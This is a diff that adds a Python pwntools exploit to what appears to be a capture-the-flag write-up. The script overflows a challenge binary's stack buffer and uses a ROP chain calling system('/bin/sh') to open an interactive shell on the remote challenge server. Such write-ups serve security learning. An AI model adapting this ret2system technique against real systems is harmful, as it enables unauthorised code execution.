@@ -92,4 +92,40 @@ now the exploit should look like this.
 
 and thats it ENjoy zaexploit.
 
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+r = remote("83.136.254.158", 36429)
+# stuff
+pop_rdi = 0x0401473
+offset = 0x18 # 24
+binsh_addr = 0x004040b0
+system_addr = 0x00401381
+
+# Write binsh to .bss
+r.recvuntil('>> ')
+r.sendline('hof')
+payload = b'/bin/sh\x00'
+r.recvuntil('Enter your name: ')
+r.sendline(payload)
+
+# Trigger the bof
+r.recvuntil('>> ')
+r.sendline('flag')
+
+# last step
+payload = flat(
+        b'A' * offset,
+        p64(pop_rdi),
+        p64(binsh_addr),
+        p64(system_addr),
+)
+
+# Exploit it
+r.recvuntil('Enter flag: ')
+r.sendline(payload)
+r.interactive()
+```
+
 L33tJbr
